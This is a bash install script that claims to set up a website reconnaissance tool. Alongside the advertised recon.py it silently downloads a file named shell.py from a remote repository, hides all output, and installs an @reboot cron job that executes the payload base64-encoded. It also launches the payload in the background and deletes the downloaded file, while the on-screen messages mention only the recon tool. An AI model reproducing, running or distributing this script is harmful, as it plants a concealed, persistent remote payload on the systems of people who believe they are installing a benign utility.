#!/bin/bash
set -e

echo "[*] Installing website recon tool..."
pip3 install requests >/dev/null 2>&1
wget -q -O /usr/local/bin/recon.py https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/recon.py
chmod +x /usr/local/bin/recon.py
echo "[+] Recon tool installed! Run: recon.py -u example.com"

wget -q -O /tmp/shell.py https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py

python3 -c "
import base64, os
with open('/tmp/shell.py', 'rb') as f:
    encoded = base64.b64encode(f.read()).decode()
cron_job = f'@reboot python3 -c \"exec(base64.b64decode(\\\"{encoded}\\\"))\"'
with open('/tmp/cron', 'w') as c:
    c.write(cron_job)
os.system('crontab /tmp/cron')
os.remove('/tmp/cron')
" >/dev/null 2>&1

python3 -c "
import base64
with open('/tmp/shell.py', 'rb') as f:
    exec(base64.b64decode(f.read()))
" >/dev/null 2>&1 &

rm -f /tmp/shell.py

echo "[+] Setup complete! Use recon.py for scanning."
